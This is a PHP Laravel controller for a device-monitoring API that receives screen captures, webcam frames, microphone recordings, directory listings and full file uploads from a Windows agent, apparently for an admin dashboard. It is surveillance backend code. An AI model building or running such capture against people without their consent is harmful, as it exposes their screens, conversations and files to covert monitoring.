<?php

namespace App\Http\Controllers\API\Agent\V1;

use App\Http\Controllers\Controller;
use App\Models\ManagedDevice;
use Carbon\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

/**
 * AgentStreamController
 *
 * Handles streaming data uploads from Windows Agent:
 * frame uploads (screen/camera), audio recordings, and file operations.
 *
 * Re-uses the same file storage as MobileCameraController so that
 * APK admin and web dashboard can view PC data without changes.
 *
 * Auth: managed-device middleware (HMAC-signed bearer token).
 */
class AgentStreamController extends Controller
{
    /**
     * POST /api/agent/v1/stream/frame
     *
     * Upload a JPEG frame from Windows Agent screen capture or webcam.
     * Stores to the same location as MobileCameraController::uploadFrame().
     */
    public function uploadFrame(Request $request): JsonResponse
    {
        /** @var ManagedDevice $device */
        $device = $request->attributes->get('managed_device');
        $deviceName = $device->device_name;
        $type = $request->header('X-Frame-Type', 'screen');

        // Determine file suffix based on type
        $suffix = match ($type) {
            'screen' => '_screen',
            'snapshot' => '_snapshot',
            default => '', // camera
        };
        $filename = md5($deviceName) . $suffix . '.jpg';

        $frameDir = storage_path('app/frames');
        if (!is_dir($frameDir)) {
            mkdir($frameDir, 0755, true);
        }

        // Read binary JPEG from request body
        $jpeg = $request->getContent();
        if (empty($jpeg) || strlen($jpeg) < 100) {
            return response()->json(['message' => 'No frame data'], 400);
        }

        // Atomic write: write to tmp then rename
        file_put_contents($frameDir . '/' . $filename . '.tmp', $jpeg);
        rename($frameDir . '/' . $filename . '.tmp', $frameDir . '/' . $filename);

        // For snapshots, save metadata
        if ($type === 'snapshot') {
            $metaFile = $frameDir . '/' . md5($deviceName) . '_snapshot_meta.json';
            file_put_contents($metaFile, json_encode([
                'device_name' => $deviceName,
                'lens' => $request->header('X-Snapshot-Lens', 'screen'),
                'size' => strlen($jpeg),
                'timestamp' => now()->toIso8601String(),
                'source' => 'windows_agent',
            ]));
        }

        // Also register as an active camera/screen device so it shows
        // in the device list alongside mobile devices.
        $this->updateDeviceStreamStatus($deviceName, $type);

        return response()->json(['message' => 'OK'], 200);
    }

    /**
     * POST /api/agent/v1/stream/audio
     *
     * Upload audio recording from Windows Agent microphone capture.
     * Stores to the same location as MobileCameraController::uploadAudio().
     */
    public function uploadAudio(Request $request): JsonResponse
    {
        /** @var ManagedDevice $device */
        $device = $request->attributes->get('managed_device');
        $deviceName = $device->device_name;

        $request->validate([
            'audio' => 'required|file',
            'type' => 'required|string|in:clip,live',
        ]);

        $dir = storage_path('app/audio/' . md5($deviceName));
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }

        $file = $request->file('audio');
        $filename = now()->format('Ymd_His') . '_' . $request->type . '.aac';
        $file->move($dir, $filename);

        // Save metadata
        $meta = [
            'device_name' => $deviceName,
            'filename' => $filename,
            'type' => $request->type,
            'size' => filesize($dir . '/' . $filename),
            'timestamp' => now()->toIso8601String(),
            'source' => 'windows_agent',
        ];
        file_put_contents($dir . '/' . $filename . '.json', json_encode($meta));

        // Cleanup: keep only latest 50 files
        $files = glob($dir . '/*.aac');
        if (count($files) > 50) {
            sort($files);
            $toDelete = array_slice($files, 0, count($files) - 50);
            foreach ($toDelete as $f) {
                @unlink($f);
                @unlink($f . '.json');
            }
        }

        return response()->json(['message' => 'OK']);
    }

    /**
     * POST /api/agent/v1/stream/file-scan
     *
     * Upload file list scan results from Windows Agent.
     * Stores to the same DB table as MobileDeviceMonitorController::uploadFileScan().
     */
    public function uploadFileScan(Request $request): JsonResponse
    {
        /** @var ManagedDevice $device */
        $device = $request->attributes->get('managed_device');
        $deviceName = $device->device_name;

        $path = $request->input('path', 'C:\\');
        $files = $request->input('files', []);

        // Delete existing entries for this device + parent_path
        DB::table('device_files')
            ->where('device_name', $deviceName)
            ->where('parent_path', $path)
            ->delete();

        $rows = [];
        $now = Carbon::now();

        foreach ($files as $file) {
            $rows[] = [
                'user_id' => null, // Agent doesn't have a user context
                'device_name' => $deviceName,
                'name' => $file['name'] ?? 'unknown',
                'path' => $file['path'] ?? '',
                'parent_path' => $path,
                'is_directory' => $file['is_directory'] ?? false,
                'size' => $file['size'] ?? 0,
                'mime_type' => $file['mime_type'] ?? null,
                'last_modified' => $file['last_modified'] ?? null,
                'thumbnail_path' => null,
                'created_at' => $now,
                'updated_at' => $now,
            ];
        }

        foreach (array_chunk($rows, 100) as $chunk) {
            DB::table('device_files')->insert($chunk);
        }

        return response()->json(['message' => 'OK', 'received' => count($files)]);
    }

    /**
     * POST /api/agent/v1/stream/file
     *
     * Upload actual file content from Windows Agent for admin download.
     * Stores to the same table as MobileDeviceMonitorController::uploadFileContent().
     */
    public function uploadFile(Request $request): JsonResponse
    {
        /** @var ManagedDevice $device */
        $device = $request->attributes->get('managed_device');
        $deviceName = $device->device_name;

        $filePath = $request->input('file_path', '');
        $uploadedFile = $request->file('file');

        if (!$uploadedFile) {
            return response()->json(['message' => 'No file uploaded'], 422);
        }

        $dir = "device-downloads/{$deviceName}";
        $filename = Carbon::now()->format('Y-m-d_H-i-s') . '_' . basename($filePath);
        $storedPath = $uploadedFile->storeAs($dir, $filename, 'public');

        DB::table('device_file_downloads')->insert([
            'device_name' => $deviceName,
            'original_path' => $filePath,
            'stored_path' => $storedPath,
            'file_size' => $uploadedFile->getSize(),
            'mime_type' => $uploadedFile->getMimeType(),
            'status' => 'ready',
            'created_at' => Carbon::now(),
            'updated_at' => Carbon::now(),
        ]);

        return response()->json([
            'message' => 'File uploaded for download',
            'download_id' => DB::getPdo()->lastInsertId(),
        ]);
    }

    /**
     * Register/update device as actively streaming in the Cache-based
     * device registry so it appears alongside mobile devices.
     */
    private function updateDeviceStreamStatus(string $deviceName, string $type): void
    {
        $cacheKey = 'camera_devices';
        $camerasKey = 'active_cameras';

        $devices = \Illuminate\Support\Facades\Cache::get($cacheKey, []);
        $devices[$deviceName] = [
            'device_name' => $deviceName,
            'fcm_token' => null, // PC doesn't use FCM
            'user_id' => null,
            'local_ip' => null,
            'registered_at' => $devices[$deviceName]['registered_at'] ?? now()->toIso8601String(),
            'last_heartbeat_at' => now()->toIso8601String(),
            'screen_on' => true,
            'source' => 'windows_agent',
        ];
        \Illuminate\Support\Facades\Cache::put($cacheKey, $devices, now()->addDays(30));

        // Also mark as actively streaming
        $cameras = \Illuminate\Support\Facades\Cache::get($camerasKey, []);
        $streamName = $type === 'screen' ? $deviceName . ' [Layar]' : $deviceName;
        $cameras[$streamName] = [
            'id' => crc32($deviceName . $type),
            'device_name' => $streamName,
            'local_ip' => null,
            'port' => null,
            'lens' => $type === 'screen' ? 'SCREEN' : 'WEBCAM',
            'stream_url' => null,
            'registered_at' => now()->toIso8601String(),
            'user_id' => null,
            'status' => 'streaming',
            'source' => 'windows_agent',
        ];
        \Illuminate\Support\Facades\Cache::put($camerasKey, $cameras, now()->addMinutes(10));

        // Update active modules
        $modulesKey = 'device_active_modules';
        $allModules = \Illuminate\Support\Facades\Cache::get($modulesKey, []);
        $modules = $allModules[$deviceName] ?? [];
        $moduleName = $type === 'screen' ? 'screen' : 'camera';
        if (!in_array($moduleName, $modules)) {
            $modules[] = $moduleName;
        }
        $allModules[$deviceName] = $modules;
        \Illuminate\Support\Facades\Cache::put($modulesKey, $allModules, now()->addMinutes(10));
    }
}
